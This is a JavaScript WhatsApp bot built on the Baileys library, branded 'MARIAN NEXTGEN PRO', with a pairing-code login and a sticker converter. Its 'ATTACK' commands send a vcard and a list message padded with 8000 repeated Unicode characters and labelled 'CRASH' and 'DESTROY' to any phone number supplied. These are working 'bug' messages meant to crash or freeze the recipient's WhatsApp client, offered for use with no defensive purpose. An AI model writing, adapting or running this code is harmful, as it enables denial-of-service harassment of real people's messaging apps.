const { 
    default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, 
    makeCacheableSignalKeyStore, generateWAMessageFromContent, proto, getContentType, downloadContentFromMessage 
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fs = require('fs')
const chalk = require("chalk")
const axios = require('axios')
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const path = require('path')

// ==================== [ INTERNAL MODULES ] ====================

async function imageToWebp(media) {
    const tmpFileIn = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.jpg`)
    const tmpFileOut = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.webp`)
    fs.writeFileSync(tmpFileIn, media)
    await new Promise((resolve, reject) => {
        ff(tmpFileIn).on("error", reject).on("end", () => resolve(true))
        .addOutputOptions(["-vcodec","libwebp","-vf","scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
        .toFormat("webp").save(tmpFileOut)
    })
    const buff = fs.readFileSync(tmpFileOut)
    fs.unlinkSync(tmpFileOut); fs.unlinkSync(tmpFileIn)
    return buff
}

// ==================== [ CORE ENGINE - BAILEYS PRO ] ====================

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState("sessions")
    
    // Konfigurasi khusus Baileys Pro hamxyztmvn
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: ["iOS", "Safari", "17.2.1"],
        version: [2, 3000, 1017531287],
        syncFullHistory: false,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000
    })

    if (!sock.authState.creds.registered) {
        const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
        console.log(chalk.red.bold("\n💀 LOGIN MARIAN NEXTGEN - PRO ENGINE 💀"))
        readline.question(chalk.yellow("ENTER YOUR PHONE: "), async (nr) => {
            const cleanNr = nr.replace(/[^0-9]/g, '')
            console.log(chalk.grey("[!] Requesting Pairing Code via Pro Engine..."));
            await delay(10000) // Bypass delay
            try {
                let code = await sock.requestPairingCode(cleanNr)
                code = code?.match(/.{1,4}/g)?.join("-") || code
                console.log(chalk.white.bold("\nYOUR OTP: ") + chalk.bgGreen.black(` ${code} `))
            } catch (err) { console.log(chalk.red("\n[✗] Connection Closed. Restart UserLand!")) }
            readline.close()
        })
    }

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("messages.upsert", async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            const from = m.key.remoteJid
            const type = getContentType(m.message)
            const body = (type === 'conversation') ? m.message.conversation : (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : (type === 'imageMessage') ? m.message.imageMessage.caption : ''
            const prefix = "/"
            if (!body.startsWith(prefix)) return

            const args = body.slice(prefix.length).trim().split(/ +/)
            const command = args.shift().toLowerCase()
            const text = args.join(" ")
            const target = text ? text.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from

            // --- MENU ---
            if (command === "menu") {
                const help = `*💀 MARIAN NEXTGEN PRO*

*ATTACK:* /bug, /bug2, /bug3
*TOOLS:* /s, /tiktok, /hd
*SYSTEM:* /ping`
                await sock.sendMessage(from, { text: help })
            }

            // --- BUG LOGIC ---
            if (command === "bug") {
                const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:MARIAN-KILLER\nTEL;waid=' + target.split('@')[0] + ':+' + target.split('@')[0] + '\nEND:VCARD'
                await sock.sendMessage(target, { contacts: { displayName: "DIE", contacts: [{ vcard }] } })
                await sock.sendMessage(from, { text: "✅ Vcard Attack Sent." })
            }

            if (command === "bug2") {
                const bug = generateWAMessageFromContent(target, {
                    listMessage: {
                        title: "M.A.R.I.A.N" + "𑫀".repeat(8000),
                        buttonText: "DESTROY",
                        sections: [{ title: "EXECUTE", rows: [{ title: "CRASH", rowId: "1" }] }]
                    }
                }, { userJid: target })
                await sock.relayMessage(target, bug.message, { messageId: bug.key.id })
            }

            // --- MULTIMEDIA ---
            if (command === "s" || command === "sticker") {
                const quoted = m.message[type]?.contextInfo?.quotedMessage || (type === 'imageMessage' ? m.message : null)
                if (!quoted) return
                const stream = await downloadContentFromMessage(quoted.imageMessage || quoted, 'image')
                let buffer = Buffer.from([])
                for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
                let webp = await imageToWebp(buffer)
                await sock.sendMessage(from, { sticker: webp })
            }

        } catch (e) { console.log(e) }
    })
}
startBot()


